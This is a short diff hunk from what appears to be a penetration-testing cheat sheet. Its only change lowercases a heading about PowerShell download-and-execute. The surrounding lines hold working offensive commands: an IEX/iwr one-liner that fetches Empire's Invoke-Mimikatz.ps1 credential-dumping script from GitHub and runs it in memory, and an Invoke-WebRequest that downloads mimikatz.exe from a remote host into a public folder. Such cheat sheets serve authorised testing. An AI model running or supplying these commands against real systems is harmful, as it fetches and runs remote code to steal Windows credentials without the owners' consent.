@@ -25,7 +25,7 @@ IEX (iwr 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/mod
 Invoke-WebRequest "http://10.10.10.10/mimikatz.exe" -OutFile "C:\Users\Public\mimikatz.exe"
 
 
-### PowerShell 3.0+ download and execute (bypass IE firstrun check)
+### powershell 3.0+ download and execute (bypass IE firstrun check)
 
 IEX (iwr 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1' -UseBasicParsing)
 
